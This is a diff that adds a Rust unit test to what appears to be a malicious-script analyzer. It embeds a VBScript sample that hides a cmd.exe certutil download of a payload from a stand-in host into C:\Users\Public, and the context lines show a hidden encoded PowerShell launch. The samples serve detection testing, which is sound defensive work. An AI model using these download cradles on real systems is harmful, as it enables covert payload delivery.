@@ -20294,6 +20294,32 @@ Launch "power" & "shell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGYAcgBv
     }
 
     #[test]
+    fn vbs_multi_arg_wrapper_local_shell_command_download_extracted() {
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+
+Function Fetch(ByVal url, ByRef dst)
+  Dim cmd
+  cmd = "cmd.exe /c certutil -urlcache -split -f """ & url & """ """ & dst & """"
+  sh.Run cmd, 0, True
+End Function
+
+If Not Fetch("https://wrapper.example/payload.dat", "C:\Users\Public\payload.dat") Then WScript.Quit 0"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "https://wrapper.example/payload.dat"
+                )
+            }),
+            "multi-arg VBS wrapper shell command download was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn vbs_shell_application_shellexecute_schemeless_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Set sh = CreateObject("Shell.Application")
